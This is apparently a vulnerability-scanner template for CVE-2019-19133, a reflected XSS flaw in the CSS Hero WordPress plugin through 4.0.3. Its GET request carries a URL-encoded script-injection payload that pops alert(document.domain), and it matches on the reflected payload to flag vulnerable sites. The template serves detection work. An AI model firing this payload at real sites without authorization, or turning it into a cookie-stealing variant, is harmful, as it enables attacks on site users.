id: CVE-2019-19133

info:
  name: CSS Hero plugin through 4.0.3 - XSS
  author: pikpikcu
  severity: medium
  description: |
    The CSS Hero plugin through 4.0.3 for WordPress is prone to reflected XSS via the URI in a csshero_action=edit_page request because it fails to sufficiently sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary JavaScript in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookies or launch other attacks.
  reference: https://nvd.nist.gov/vuln/detail/CVE-2019-19133
  tags: cve,cve2019,xss,wordpress

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?csshero_action=edit_page&rand=1015&foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ciframe%3Ebar"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"></iframe><script>alert(document.domain)</script><iframe>'

      - type: status
        status:
          - 200
